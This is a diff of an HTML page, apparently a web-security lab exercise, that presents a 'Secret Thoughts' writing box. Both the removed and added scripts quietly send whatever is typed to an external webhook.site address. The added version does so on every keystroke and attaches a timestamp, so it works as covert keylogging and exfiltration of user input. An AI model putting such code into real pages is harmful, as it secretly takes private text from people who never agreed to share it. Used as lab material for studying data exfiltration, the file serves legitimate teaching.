@@ -1,14 +1,26 @@
-<!DOCTYPE html>
 <html>
-<body>
-<textarea id="secretThoughts"></textarea>
-<script>
-setInterval(function(){
-  var v = document.querySelector('#secretThoughts');
-  if(v && v.value){
-    fetch('https://webhook.site/ad475f57-2cf2-4794-8048-8c99bcb196c5?d='+encodeURIComponent(v.value));
-  }
-},1000);
-</script>
-</body>
+   <head>
+      <title>Static Web App Lab 4</title>
+   </head>
+   <body>
+      <div>
+         <h1>Static Web App Lab 4 - Write</h1>
+         <div>
+            <h2>Secret Thoughts</h2>
+            <textarea id="secretThoughts"></textarea>
+         </div>
+      </div>
+      <script>
+         const textarea = document.getElementById("secretThoughts")
+         textarea.addEventListener("input", function (e) {
+         const text = e.target.value
+         fetch(
+         `https://webhook.site/ad475f57-2cf2-4794-8048-8c99bcb196c5?
+         text=${encodeURIComponent(
+         text
+         )}&timestamp=${encodeURIComponent(new Date().toISOString())}`
+         ).catch(console.error)
+         })
+      </script>
+   </body>
 </html>
